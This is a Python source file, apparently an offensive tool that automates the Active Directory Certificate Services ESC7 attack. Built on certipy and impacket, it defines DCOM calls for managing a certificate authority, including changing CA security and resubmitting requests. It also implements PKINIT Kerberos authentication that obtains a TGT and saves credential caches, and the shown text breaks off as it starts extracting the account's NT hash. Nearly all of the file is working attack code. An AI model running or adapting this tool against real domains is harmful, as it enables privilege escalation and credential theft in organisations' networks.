#!/usr/bin/env python3


import argparse
import sys
import os
import re
import time
import copy
import base64
import datetime
import io
import getpass
import logging as py_logging
import socket
import traceback as tb
from random import getrandbits
import signal
import threading

_interrupt_event = threading.Event()

def _signal_handler(signum, frame):
    _interrupt_event.set()
    raise KeyboardInterrupt

signal.signal(signal.SIGINT, _signal_handler)

from typing import Optional, Union, List, Tuple

_MISSING = []
for _pkg, _install in [
    ("certipy", "certipy-ad"),
    ("impacket", "impacket"),
    ("pyasn1",  "pyasn1"),
    ("asn1crypto", "asn1crypto"),
    ("cryptography", "cryptography"),
]:
    try:
        __import__(_pkg)
    except ImportError:
        _MISSING.append((_pkg, _install))

if _MISSING:
    print("[-] Missing required packages:")
    for pkg, inst in _MISSING:
        print(f"      {pkg}  ->  pip install {inst}")
    sys.exit(1)

try:
    from certipy.lib.target import Target
    from certipy.lib.logger import logging as certipy_logging
    from certipy.lib.ldap import LDAPConnection, LDAPEntry
    from certipy.lib.certificate import (
        NameOID, create_pfx, der_to_cert, load_pfx,
        print_certificate_authentication_information,
        get_identities_from_certificate,
        get_object_sid_from_certificate,
        cert_id_to_parts, hash_digest, hashes,
        x509 as certipy_x509,
    )
    from certipy.lib.constants import CertificateAuthorityRights
    from certipy.lib.errors import handle_error, translate_error_code
    from certipy.lib.files import try_to_save_file
    from certipy.lib.kerberos import get_tgs
    from certipy.lib.pkinit import build_pkinit_as_req
    from certipy.lib.structs import EncType, KDCDHKeyInfo, PaPkAsRep, e2i
    from certipy.lib.security import CASecurity
except ImportError as _e:
    print(f"[-] Failed to import certipy library: {_e}")
    print("[-] Ensure certipy-ad is installed: pip install certipy-ad")
    sys.exit(1)

try:
    from certipy.lib.req import Request
except ImportError:
    try:
        from certipy.commands.req import Request
    except ImportError:
        print("[-] Cannot import certipy Request module from either location")
        print("[-] Try: pip install --upgrade certipy-ad")
        sys.exit(1)

try:
    from impacket.dcerpc.v5 import rpcrt, rrp, scmr
    from impacket.dcerpc.v5.dcom.oaut import VARIANT
    from impacket.dcerpc.v5.dcomrt import (
        DCOMANSWER, DCOMCALL, IRemUnknown, IRemUnknown2,
    )
    from impacket.dcerpc.v5.dtypes import (
        DWORD, LONG, LPWSTR, PBYTE, ULONG, WSTR,
    )
    from impacket.dcerpc.v5.ndr import NDRSTRUCT
    from impacket.dcerpc.v5.nrpc import checkNullString
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        DCERPCException,
        TypeSerialization1,
    )
    from impacket.examples.ldap_shell import LdapShell as _LdapShell
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AD_IF_RELEVANT, AP_REQ, AS_REP, TGS_REP, TGS_REQ,
        Authenticator, EncASRepPart, EncTicketPart,
        seq_set, seq_set_iter, Ticket as TicketAsn1,
    )
    from impacket.krb5.ccache import CCache
    from impacket.krb5.crypto import Key, _enctype_table
    from impacket.krb5.kerberosv5 import KerberosError, sendReceive
    from impacket.krb5.pac import (
        NTLM_SUPPLEMENTAL_CREDENTIAL, PAC_CREDENTIAL_DATA,
        PAC_CREDENTIAL_INFO, PAC_INFO_BUFFER, PACTYPE,
    )
    from impacket.krb5.types import KerberosTime, Principal, Ticket
    from impacket.ldap import ldaptypes
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import string_to_bin, uuidtup_to_bin
except ImportError as _e:
    print(f"[-] Failed to import impacket: {_e}")
    print("[-] Install: pip install impacket")
    sys.exit(1)

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from asn1crypto import cms, core
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
except ImportError as _e:
    print(f"[-] Failed to import crypto libraries: {_e}")
    sys.exit(1)

class ESC7Error(Exception):
    """Base exception for all ESC7 attack errors."""
    def __init__(self, message: str, hint: str = "", recoverable: bool = False):
        super().__init__(message)
        self.hint        = hint
        self.recoverable = recoverable

class NetworkError(ESC7Error):
    """Raised for connectivity / network failures."""

class AuthError(ESC7Error):
    """Raised for authentication failures."""

class LDAPError(ESC7Error):
    """Raised for LDAP-related failures."""

class DCOMError(ESC7Error):
    """Raised for DCOM/RPC failures."""

class CertificateError(ESC7Error):
    """Raised for certificate operation failures."""

class ConfigError(ESC7Error):
    """Raised for configuration / input validation failures."""

class StepError(ESC7Error):
    """Raised when an attack step fails."""

class C:
    H  = '\033[95m'
    B  = '\033[94m'
    G  = '\033[92m'
    Y  = '\033[93m'
    R  = '\033[91m'
    X  = '\033[0m'
    BD = '\033[1m'
    DIM = '\033[2m'

def _info(m: str)  -> None: print(f"{C.B}[*]{C.X} {m}")
def _ok(m: str)    -> None: print(f"{C.G}[+]{C.X} {m}")
def _warn(m: str)  -> None: print(f"{C.Y}[!]{C.X} {m}")
def _err(m: str)   -> None: print(f"{C.R}[-]{C.X} {m}")
def _hint(m: str)  -> None: print(f"{C.DIM}    Hint: {m}{C.X}")
def _debug(m: str, enabled: bool = False) -> None:
    if enabled:
        print(f"{C.DIM}[DBG] {m}{C.X}")

def _banner(t: str) -> None:
    box_w = 80
    inner = box_w - 2
    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
    print(f"{C.BD}{C.B}╔" + "═" * inner + "╗{C.X}")
    print(f"{C.BD}{C.B}" + pad(t) + f"{C.X}")
    print(f"{C.BD}{C.B}╚" + "═" * inner + "╝{C.X}")

def _section(t: str) -> None:
    print(f"\n{C.B}── {t} {'─'*(65-len(t))}{C.X}")

def _prompt(
    text: str,
    default: Optional[str] = None,
    sensitive: bool = False,
    validator=None,
    error_msg: str = "Invalid input.",
) -> str:
    """
    Prompt the user for input with optional validation.
    Retries until the validator passes or the user provides non-empty input.
    """
    sfx = f" [{default}]" if default else ""
    full = f"{text}{sfx}: "
    while True:
        try:
            if sensitive:
                val = getpass.getpass(full)
            else:
                val = input(full).strip()
        except EOFError:
            _warn("EOF on stdin — using default.")
            val = ""
        except KeyboardInterrupt:
            print()
            raise

        result = val if val else (default or "")
        if not result:
            _warn("This field is required.")
            continue
        if validator is not None and not validator(result):
            _warn(error_msg)
            continue
        return result

def _prompt_optional(
    text: str,
    default: str = "",
) -> str:
    """Prompt for an optional field — empty is acceptable."""
    sfx = f" [{default}]" if default else " (optional)"
    try:
        val = input(f"{text}{sfx}: ").strip()
    except (EOFError, KeyboardInterrupt):
        return default
    return val if val else default

def _prompt_bool(text: str, default: bool = False) -> bool:
    suffix = " [Y/n]: " if default else " [y/N]: "
    try:
        val = input(text + suffix).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return default
    if not val:
        return default
    return val in ("y", "yes")

def _prompt_choice(options: List[str], prompt: str = "Select") -> int:
    """Show numbered options and return the selected 0-based index."""
    for i, opt in enumerate(options, 1):
        print(f"  [{i}] {opt}")
    while True:
        try:
            raw = input(f"  {prompt} [1-{len(options)}]: ").strip()
            idx = int(raw) - 1
            if 0 <= idx < len(options):
                return idx
            _warn(f"Enter a number between 1 and {len(options)}")
        except ValueError:
            _warn("Enter a valid number.")
        except (EOFError, KeyboardInterrupt):
            raise ESC7Error("User cancelled selection.")

def _is_valid_ip(s: str) -> bool:
    try:
        socket.inet_aton(s)
        return True
    except OSError:
        pass
    try:
        socket.getaddrinfo(s, None)
        return True
    except socket.gaierror:
        return False

def _is_valid_hostname(s: str) -> bool:
    if not s or len(s) > 253:
        return False
    if "@" in s:
        return False
    allowed = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?$")
    return all(allowed.match(part) for part in s.split("."))

def _is_valid_upn(s: str) -> bool:
    parts = s.split("@")
    if len(parts) != 2:
        return False
    user, domain = parts
    return bool(user) and bool(domain) and "." in domain

def _is_valid_domain(s: str) -> bool:
    return bool(s) and "." in s and "@" not in s

def _validate_pfx_path(path: str) -> bool:
    """Validate that a PFX output path is writable."""
    if not path:
        return False
    directory = os.path.dirname(os.path.abspath(path)) or "."
    if not os.path.isdir(directory):
        return False
    return os.access(directory, os.W_OK)

def _validate_existing_pfx(path: str) -> bool:
    """Validate that a PFX file exists and is readable."""
    return bool(path) and os.path.isfile(path) and os.access(path, os.R_OK)

# Connectivity Pre-checks

def _tcp_reachable(host: str, port: int, timeout: float = 3.0) -> bool:
    """Return True if host:port accepts a TCP connection."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (OSError, socket.timeout):
        return False

def precheck_connectivity(dc_ip: str, ca_fqdn: str = "") -> None:
    """
    Verify basic network connectivity before spending time on DCOM.
    Raises NetworkError with remediation hints if anything is unreachable.
    """
    _section("Pre-flight connectivity checks")
    checks = [
        (dc_ip, 389,  "LDAP  (389)"),
        (dc_ip, 636,  "LDAPS (636)"),
        (dc_ip, 88,   "Kerberos (88)"),
        (dc_ip, 135,  "RPC endpoint mapper (135)"),
    ]
    if ca_fqdn and ca_fqdn != dc_ip and "@" not in ca_fqdn:
        checks.append((ca_fqdn, 135, f"CA RPC ({ca_fqdn}:135)"))

    all_ok = True
    try:
        for host, port, label in checks:
            ok = _tcp_reachable(host, port)
            icon = f"{C.G}✓{C.X}" if ok else f"{C.R}✗{C.X}"
            print(f"  {icon}  {label}")
            if not ok:
                all_ok = False
    except KeyboardInterrupt:
        print()
        _warn("Connectivity check interrupted by user.")
        sys.exit(130)

    if not all_ok:
        raise NetworkError(
            "One or more required ports are unreachable.",
            hint=(
                "Ensure the DC/CA is online and the ports above are not "
                "blocked by a firewall. If using a VPN, confirm routing."
            ),
        )
    _ok("All connectivity checks passed.")

class LogCapture:
    """
    Context manager that:
      1. Captures all certipy log messages to an in-memory list.
      2. Patches certipy's custom logger object directly (bypasses Rich).
      3. Patches try_to_save_file to never ask 'Overwrite?' interactively.
    """

    def __init__(self, debug: bool = False):
        self.lines:           List[str] = []
        self.debug_enabled              = debug
        self._patched_methods: dict     = {}
        self._orig_save                 = None
        self._orig_save_in_req          = None
        self._handler                   = py_logging.StreamHandler(
            self._make_stream()
        )
        self._handler.setLevel(py_logging.DEBUG)
        self._handler.setFormatter(py_logging.Formatter("%(message)s"))

    def _make_stream(self):
        capture = self

        class _LS:
            def write(self, msg: str):
                clean = msg.strip()
                if clean:
                    capture.lines.append(clean)
            def flush(self): pass

        return _LS()

    def __enter__(self):
        for name in (
            "certipy", "certipy.lib", "certipy.lib.req",
            "certipy.lib.logger", "",
        ):
            py_logging.getLogger(name).addHandler(self._handler)

        self._patch_certipy_logger()
        self._patch_save_file()
        return self

    def __exit__(self, *_):
        for name in (
            "certipy", "certipy.lib", "certipy.lib.req",
            "certipy.lib.logger", "",
        ):
            lg = py_logging.getLogger(name)
            try:
                lg.removeHandler(self._handler)
            except Exception:
                pass

        self._unpatch_certipy_logger()
        self._unpatch_save_file()

    # ── certipy logger patch ──────────────────────────────────────────────────
    def _patch_certipy_logger(self):
        try:
            import certipy.lib.logger as _clog
            log_obj = getattr(_clog, "logging", None)
            if log_obj is None:
                return
            capture = self
            for method_name in (
                "info", "warning", "error", "debug", "success", "log"
            ):
                orig = getattr(log_obj, method_name, None)
                if orig is None:
                    continue

                def _make_wrapper(original, _n=method_name):
                    def _w(msg, *a, **kw):
                        capture.lines.append(str(msg))
                        return original(msg, *a, **kw)
                    return _w

                wrapper = _make_wrapper(orig)
                setattr(log_obj, method_name, wrapper)
                self._patched_methods[method_name] = (log_obj, orig)
        except Exception as e:
            _debug(f"Logger patch failed (non-fatal): {e}",
                   self.debug_enabled)

    def _unpatch_certipy_logger(self):
        for method_name, (log_obj, orig) in self._patched_methods.items():
            try:
                setattr(log_obj, method_name, orig)
            except Exception:
                pass
        self._patched_methods.clear()

    # ── try_to_save_file patch ────────────────────────────────────────────────
    def _patch_save_file(self):
        try:
            import certipy.lib.files as _cf
            import certipy.lib.req   as _cr

            self._orig_save        = _cf.try_to_save_file
            self._orig_save_in_req = getattr(_cr, "try_to_save_file", None)

            def _silent_save(data: bytes, filename: str) -> str:
                try:
                    directory = os.path.dirname(os.path.abspath(filename))
                    os.makedirs(directory, exist_ok=True)
                    with open(filename, "wb") as fh:
                        fh.write(data)
                    return filename
                except PermissionError as e:
                    raise CertificateError(
                        f"Cannot write to {filename!r}: permission denied.",
                        hint="Check file/directory permissions.",
                    ) from e
                except OSError as e:
                    raise CertificateError(
                        f"Failed to write {filename!r}: {e}",
                    ) from e

            _cf.try_to_save_file = _silent_save
            if self._orig_save_in_req is not None:
                _cr.try_to_save_file = _silent_save
        except Exception as e:
            _debug(f"Save-file patch failed (non-fatal): {e}",
                   self.debug_enabled)

    def _unpatch_save_file(self):
        try:
            import certipy.lib.files as _cf
            import certipy.lib.req   as _cr
            if self._orig_save is not None:
                _cf.try_to_save_file = self._orig_save
            if self._orig_save_in_req is not None:
                _cr.try_to_save_file = self._orig_save_in_req
        except Exception:
            pass

    # ── helpers ───────────────────────────────────────────────────────────────
    def get_text(self) -> str:
        return "\n".join(self.lines)

    def was_issued_immediately(self) -> bool:
        text = self.get_text()
        issued_patterns = [
            r"[Ss]uccessfully\s+requested\s+certificate",
            r"[Ss]aved\s+certificate\s+and\s+private\s+key",
            r"[Ww]rote\s+certificate\s+and\s+private\s+key",
            r"Got certificate",
        ]
        denied_patterns = [
            r"[Dd]enied",
            r"[Pp]ending",
            r"CR_DISP",
            r"CERTSRV_E_BAD_REQUESTSTATUS",
        ]
        was_issued = any(re.search(p, text) for p in issued_patterns)
        was_denied = any(re.search(p, text) for p in denied_patterns)
        return was_issued and not was_denied

    def find_request_id(self) -> Optional[int]:
        text = self.get_text()
        patterns = [
            r"[Rr]equest\s+[Ii][Dd]\s+is\s+(\d+)",
            r"[Rr]equest\s+[Ii][Dd]\s*[:=]\s*(\d+)",
            r"[Gg]ot\s+certificate\s+request\s+[Ii][Dd]\s+(\d+)",
            r"[Cc]ertificate\s+[Rr]equest\s+[Ii][Dd]\s*[=:]\s*(\d+)",
            r"[Rr]equest\s*#?\s*(\d+)",
        ]
        for pat in patterns:
            m = re.search(pat, text)
            if m:
                try:
                    candidate = int(m.group(1))
                    if 1 <= candidate <= 10_000_000:
                        return candidate
                except ValueError:
                    pass
        return None

    def find_pfx_path(self) -> Optional[str]:
        text = self.get_text()
        patterns = [
            r"[Ss]aved certificate and private key to '([^']+\.pfx)'",
            r"[Ww]rote certificate and private key to '([^']+\.pfx)'",
            r"Saving certificate and private key to '([^']+\.pfx)'",
        ]
        for pat in patterns:
            m = re.search(pat, text)
            if m:
                path = m.group(1)
                if os.path.isfile(path):
                    return path
        return None

    def has_error(self, keyword: str) -> bool:
        return keyword.lower() in self.get_text().lower()

    def print_captured(self, label: str = "Captured output") -> None:
        text = self.get_text()
        if text:
            _section(label)
            for line in self.lines:
                print(f"  {C.DIM}{line}{C.X}")

IF_NOREMOTEICERTADMINBACKUP = 0x40
CR_PROP_TEMPLATES           = 0x0000001D

CLSID_ICertAdminD   = string_to_bin("d99e6e73-fc88-11d0-b498-00a0c90312f3")
CLSID_CCertRequestD = string_to_bin("d99e6e74-fc88-11d0-b498-00a0c90312f3")
IID_ICertAdminD     = uuidtup_to_bin(
    ("d99e6e71-fc88-11d0-b498-00a0c90312f3", "0.0")
)
IID_ICertAdminD2    = uuidtup_to_bin(
    ("7fe0d935-dda6-443f-85d0-1cfb58fe41dd", "0.0")
)
IID_ICertRequestD2  = uuidtup_to_bin(
    ("5422fd3a-d4b8-4cef-a12e-e87d4ca22e90", "0.0")
)

# Human-readable CERTSRV error codes
CERTSRV_ERRORS = {
    0x80094001: "CERTSRV_E_BAD_REQUESTSUBJECT — invalid request subject",
    0x80094002: "CERTSRV_E_NO_REQUEST — request not found",
    0x80094003: (
        "CERTSRV_E_BAD_REQUESTSTATUS — request already issued or "
        "wrong state for this operation"
    ),
    0x80094004: "CERTSRV_E_BAD_TEMPLATE_VERSION — incompatible template version",
    0x80094800: "CERTSRV_E_TEMPLATE_DENIED — template access denied",
    0x80070005: "E_ACCESSDENIED — insufficient privileges",
    0x80070057: "E_INVALIDARG — invalid argument",
}

def _certsrv_error(code: int) -> str:
    code &= 0xFFFFFFFF
    known = CERTSRV_ERRORS.get(code)
    if known:
        return f"0x{code:08X}: {known}"
    try:
        return translate_error_code(code)
    except Exception:
        return f"0x{code:08X}: unknown error"

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self) -> str:
        self.error_code &= 0xFFFFFFFF
        return f"CASessionError: {_certsrv_error(self.error_code)}"

class CERTTRANSBLOB(NDRSTRUCT):
    structure = (("cb", ULONG), ("pb", PBYTE))

# ── RPC call structures ───────────────────────────────────────────────────────
class ICertAdminDResubmitRequest(DCOMCALL):
    opnum     = 5
    structure = (
        ("pwszAuthority",     LPWSTR),
        ("pdwRequestId",      DWORD),
        ("pwszExtensionName", LPWSTR),
    )

class ICertAdminDResubmitRequestResponse(DCOMANSWER):
    structure = (("pdwDisposition", ULONG),)

class ICertAdminDDenyRequest(DCOMCALL):
    opnum     = 6
    structure = (("pwszAuthority", LPWSTR), ("pdwRequestId", DWORD))

class ICertAdminDDenyRequestResponse(DCOMANSWER):
    structure = (("ErrorCode", ULONG),)

class ICertAdminD2GetCAProperty(DCOMCALL):
    opnum     = 32
    structure = (
        ("pwszAuthority", LPWSTR),
        ("PropId",        LONG),
        ("PropIndex",     LONG),
        ("PropType",      LONG),
    )

class ICertAdminD2GetCAPropertyResponse(DCOMANSWER):
    structure = (("pctbPropertyValue", CERTTRANSBLOB),)

class ICertAdminD2SetCAProperty(DCOMCALL):
    opnum     = 33
    structure = (
        ("pwszAuthority",     LPWSTR),
        ("PropId",            LONG),
        ("PropIndex",         LONG),
        ("PropType",          LONG),
        ("pctbPropertyValue", CERTTRANSBLOB),
    )

class ICertAdminD2SetCAPropertyResponse(DCOMANSWER):
    structure = (("ErrorCode", ULONG),)

class ICertAdminD2GetCASecurity(DCOMCALL):
    opnum     = 36
    structure = (("pwszAuthority", LPWSTR),)

class ICertAdminD2GetCASecurityResponse(DCOMANSWER):
    structure = (("pctbSD", CERTTRANSBLOB),)

class ICertAdminD2SetCASecurity(DCOMCALL):
    opnum     = 37
    structure = (
        ("pwszAuthority", LPWSTR),
        ("pctbSD",        CERTTRANSBLOB),
    )

class ICertAdminD2SetCASecurityResponse(DCOMANSWER):
    structure = (("ErrorCode", LONG),)

class ICertCustom(IRemUnknown):
    def request(self, req, *args, **kwargs):
        req["ORPCthis"]          = self.get_cinstance().get_ORPCthis()
        req["ORPCthis"]["flags"] = 0
        try:
            self.connect(self._iid)
        except Exception as e:
            raise DCOMError(
                f"DCOM connect failed: {e}",
                hint=(
                    "Verify the CA service is running and the account "
                    "has DCOM access permissions."
                ),
            ) from e
        dce = self.get_dce_rpc()
        try:
            return dce.request(req, self.get_iPid(), *args, **kwargs)
        except Exception as e:
            if "RPC_E_DISCONNECTED" in str(e):
                raise DCOMError(
                    "DCOM keep-alive timed out (>14 min idle).",
                    hint="Restart the tool — DCOM sessions expire after ~14 min.",
                ) from e
            raise

class ICertAdminD(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertAdminD

class ICertAdminD2(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertAdminD2

class ICertRequestD2(ICertCustom):
    def __init__(self, interface):
        super().__init__(interface)
        self._iid = IID_ICertRequestD2

class CAConfiguration:
    def __init__(
        self,
        active_policy,
        edit_flags,
        disable_extension_list,
        request_disposition,
        interface_flags,
        security,
    ):
        self.active_policy          = active_policy
        self.edit_flags             = edit_flags
        self.disable_extension_list = disable_extension_list
        self.request_disposition    = request_disposition
        self.interface_flags        = interface_flags
        self.security               = security

class LdapShell(_LdapShell):
    def __init__(self, tcp_shell, domain_dumper, client):
        super().__init__(tcp_shell, domain_dumper, client)
        self.use_rawinput  = True
        self.shell         = tcp_shell
        self.prompt        = "\n# "
        self.tid           = None
        self.intro         = "Type help for list of commands"
        self.loggedIn      = True
        self.last_output   = None
        self.completion    = []
        self.client        = client
        self.domain_dumper = domain_dumper

    def do_dump(self, line):
        certipy_logging.warning("Not implemented")

    def do_exit(self, line):
        print("Bye!")
        return True

class DummyDomainDumper:
    def __init__(self, root):
        self.root = root

def truncate_key(value: bytes, keysize: int) -> bytes:
    output, current_num = b"", 0
    while len(output) < keysize:
        try:
            current_digest = hash_digest(
                bytes([current_num]) + value, hashes.SHA1
            )
        except Exception as e:
            raise CertificateError(
                f"Key derivation failed at iteration {current_num}: {e}"
            ) from e
        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break
        output      += current_digest
        current_num += 1
    return output

# Authenticate (PKINIT + U2U NT hash extraction)

class Authenticate:
    def __init__(
        self,
        target,
        pfx=None,
        username=None,
        domain=None,
        password=None,
        cert=None,
        key=None,
        no_save=False,
        no_hash=False,
        kirbi=False,
        ldap_shell=False,
        **kwargs,
    ):
        self.target      = target
        self.username    = username
        self.domain      = domain
        self.pfx         = pfx
        self.password    = password
        self.cert        = cert
        self.key         = key
        self.no_save     = no_save
        self.no_hash     = no_hash
        self.kirbi       = kirbi
        self.ldap_shell  = ldap_shell
        self.nt_hash:    Optional[str] = None
        self.lm_hash:    Optional[str] = None
        self.ccache_name: Optional[str] = None

        if self.pfx is not None:
            self._load_pfx()

    def _load_pfx(self) -> None:
        if not os.path.isfile(self.pfx):
            raise CertificateError(
                f"PFX file not found: {self.pfx!r}",
                hint="Ensure the retrieve step completed successfully.",
            )
        if not os.access(self.pfx, os.R_OK):
            raise CertificateError(
                f"PFX file is not readable: {self.pfx!r}",
                hint="Check file permissions.",
            )
        pfx_password = self.password.encode() if self.password else None
        try:
            with open(self.pfx, "rb") as f:
                pfx_data = f.read()
            if not pfx_data:
                raise CertificateError(
                    f"PFX file is empty: {self.pfx!r}"
                )
            self.key, self.cert = load_pfx(pfx_data, pfx_password)
            if self.key is None or self.cert is None:
                raise CertificateError(
                    "PFX did not contain a certificate or private key.",
                    hint=(
                        "The PFX may be corrupted or protected with a "
                        "password you did not provide."
                    ),
                )
        except CertificateError:
            raise
        except Exception as e:
            raise CertificateError(
                f"Failed to load PFX {self.pfx!r}: {e}",
                hint="Verify the PFX file is not corrupted.",
            ) from e

    def authenticate(
        self,
        username: Optional[str] = None,
        domain:   Optional[str] = None,
        is_key_credential: bool = False,
    ):
        if not self.cert:
            raise CertificateError("Certificate not loaded — call with pfx= or cert=")

        try:
            print_certificate_authentication_information(self.cert)
        except Exception:
            pass

        if not username:
            username = self.username or getattr(self.target, "username", None)
        if not domain:
            domain = self.domain or getattr(self.target, "domain", None)

        id_type = identity = object_sid = None
        cert_username = cert_domain = None

        if not is_key_credential:
            try:
                identities = get_identities_from_certificate(self.cert)
                object_sid = get_object_sid_from_certificate(self.cert)
            except Exception as e:
                raise CertificateError(
                    f"Failed to extract identities from certificate: {e}"
                ) from e

            if not identities:
                _warn("No identity found in certificate.")
            elif len(identities) == 1:
                id_type, identity     = identities[0]
                cert_username, cert_domain = cert_id_to_parts(
                    [(id_type, identity)]
                )
            else:
                id_type, identity     = identities[0]
                cert_username, cert_domain = cert_id_to_parts(
                    [(id_type, identity)]
                )

        username = username or cert_username
        domain   = domain   or cert_domain

        if not username or not domain:
            raise AuthError(
                "Cannot determine username/domain for authentication.",
                hint=(
                    "Provide --upn explicitly or ensure the certificate "
                    "contains a valid UPN SAN."
                ),
            )

        domain   = domain.lower().strip()
        username = username.lower().strip()

        if not username or not domain:
            raise AuthError(
                f"Username or domain is blank: {username!r}@{domain!r}"
            )

        upn = f"{username}@{domain}"
        certipy_logging.info(f"Using principal: {upn!r}")

        return self.kerberos_authentication(
            username, domain, is_key_credential,
            id_type, identity, object_sid, upn,
        )

    def kerberos_authentication(
        self,
        username:          str,
        domain:            str,
        is_key_credential: bool = False,
        id_type            = None,
        identity           = None,
        object_sid         = None,
        upn:               Optional[str] = None,
    ):
        if self.key is None or self.cert is None:
            raise CertificateError(
                "Private key and certificate are required for PKINIT."
            )
        if not isinstance(self.key, rsa.RSAPrivateKey):
            raise CertificateError(
                "Only RSA private keys are supported for PKINIT.",
                hint="Re-request the certificate without specifying a key type.",
            )

        try:
            as_req, diffie = build_pkinit_as_req(
                username, domain, self.key, self.cert
            )
        except Exception as e:
            raise CertificateError(
                f"Failed to build PKINIT AS-REQ: {e}",
                hint="The certificate may have expired or have wrong EKUs.",
            ) from e

        if (
            self.target
            and getattr(self.target, "resolver", None)
            and getattr(self.target, "target_ip", None) is None
        ):
            try:
                self.target.target_ip = self.target.resolver.resolve(domain)
            except Exception as e:
                raise NetworkError(
                    f"Cannot resolve domain {domain!r}: {e}",
                    hint="Verify DNS is configured correctly.",
                ) from e

        certipy_logging.info("Trying to get TGT...")
        try:
            tgt = sendReceive(as_req, domain, self.target.target_ip)
        except KerberosError as e:
            err_str = str(e)
            if "KDC_ERR_CLIENT_NAME_MISMATCH" in err_str:
                raise AuthError(
                    f"Certificate/username mismatch for {username!r}.",
                    hint=(
                        "The UPN in the certificate does not match the "
                        "account. Try re-requesting with the correct --upn."
                    ),
                ) from e
            if "KDC_ERR_WRONG_REALM" in err_str:
                raise AuthError(
                    f"Wrong domain {domain!r} for PKINIT.",
                    hint="Verify the domain matches the certificate's UPN.",
                ) from e
            if "KDC_ERR_CERTIFICATE_MISMATCH" in err_str:
                raise AuthError(
                    f"Object SID mismatch for {username!r}.",
                    hint=(
                        "The certificate SID does not match the user object. "
                        "This may occur if the account was recreated."
                    ),
                ) from e
            if "KDC_ERR_INCONSISTENT_KEY_PURPOSE" in err_str:
                raise AuthError(
                    "Certificate is not valid for client authentication.",
                    hint=(
                        "Ensure the template has the Client Authentication EKU. "
                        "SubCA template should work — verify step 3 succeeded."
                    ),
                ) from e
            if "KDC_ERR_PADATA_TYPE_NOSUPP" in err_str:
                raise AuthError(
                    "KDC does not support PKINIT.",
                    hint=(
                        "Ensure the DC has a valid KDC certificate and PKINIT "
                        "is enabled. This is required for ESC7."
                    ),
                ) from e
            raise AuthError(
                f"Kerberos error during TGT request: {e}",
                hint="See certipy wiki for Kerberos error code details.",
            ) from e
        except Exception as e:
            raise NetworkError(
                f"Failed to send AS-REQ to KDC: {e}",
                hint=(
                    f"Verify the DC at {self.target.target_ip} is reachable "
                    f"on port 88."
                ),
            ) from e

        certipy_logging.info("Got TGT")

        try:
            as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        except Exception as e:
            raise CertificateError(
                f"Failed to decode AS-REP: {e}"
            ) from e

        pk_as_rep = None
        try:
            for pa in as_rep["padata"]:
                if pa["padata-type"] == 17:
                    pk_as_rep = PaPkAsRep.load(
                        bytes(pa["padata-value"])
                    ).native
                    break
        except Exception as e:
            raise CertificateError(
                f"Failed to parse padata from AS-REP: {e}"
            ) from e

        if pk_as_rep is None:
            raise CertificateError(
                "PA_PK_AS_REP not found in AS_REP.",
                hint=(
                    "The KDC did not return PKINIT pre-auth data. "
                    "Verify the DC supports PKINIT."
                ),
            )

        try:
            ci       = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
            sd       = ci["content"]
            key_info = sd["encap_content_info"]
            if key_info["content_type"] != "1.3.6.1.5.2.3.2":
                raise CertificateError(
                    "Unexpected key info content type in PA_PK_AS_REP.",
                )
            auth_data = KDCDHKeyInfo.load(key_info["content"]).native
            pub_key   = int.from_bytes(
                core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
                "big",
                signed=False,
            )
            shared_key   = diffie.exchange(pub_key)
            server_nonce = pk_as_rep["serverDHNonce"]
            full_key     = shared_key + diffie.dh_nonce + server_nonce
        except CertificateError:
            raise
        except Exception as e:
            raise CertificateError(
                f"Failed to derive Diffie-Hellman shared key: {e}"
            ) from e

        etype  = as_rep["enc-part"]["etype"]
        cipher = _enctype_table.get(etype)
        if cipher is None:
            raise CertificateError(
                f"Unsupported encryption type in AS_REP: {etype}",
                hint="The DC may be using an unexpected cipher suite.",
            )

        if etype == EncType.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == EncType.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            raise CertificateError(
                f"Unexpected encryption type {etype} — only AES128/AES256 supported."
            )

        try:
            key             = Key(cipher.enctype, t_key)
            enc_data        = as_rep["enc-part"]["cipher"]
            dec_data        = cipher.decrypt(key, 3, enc_data)
            enc_as_rep_part = decoder.decode(
                dec_data, asn1Spec=EncASRepPart()
            )[0]
            cipher_enc      = _enctype_table[
                int(enc_as_rep_part["key"]["keytype"])
            ]
            session_key     = Key(
                cipher_enc.enctype,
                bytes(enc_as_rep_part["key"]["keyvalue"]),
            )
        except Exception as e:
            raise CertificateError(
                f"Failed to decrypt AS-REP enc-part: {e}",
                hint="The derived DH key may be incorrect.",
            ) from e

        try:
            ccache = CCache()
            ccache.fromTGT(tgt, key, None)
        except Exception as e:
            raise CertificateError(
                f"Failed to build credential cache: {e}"
            ) from e

        if not self.no_save:
            ccache_name = f"{username.rstrip('$')}.ccache"
            try:
                if self.kirbi:
                    kirbi_name = f"{username.rstrip('$')}.kirbi"
                    saved      = try_to_save_file(
                        ccache.toKRBCRED(), kirbi_name
                    )
                    certipy_logging.info(
                        f"Wrote Kirbi file to {saved!r}"
                    )
                else:
                    self.ccache_name = ccache_name
                    saved            = try_to_save_file(
                        ccache.getData(), ccache_name
                    )
                    certipy_logging.info(
                        f"Wrote credential cache to {saved!r}"
                    )
            except CertificateError:
                raise
            except Exception as e:
                _warn(f"Failed to save ccache/kirbi: {e} — continuing.")

        if not self.no_hash:
            certipy_logging.info(
                f"Trying to retrieve NT hash for {username!r}"
            )
            try:
                return self._extract_nt_hash(
                    username, domain, upn, as_rep,
                    session_key, cipher_enc, key, t_key,
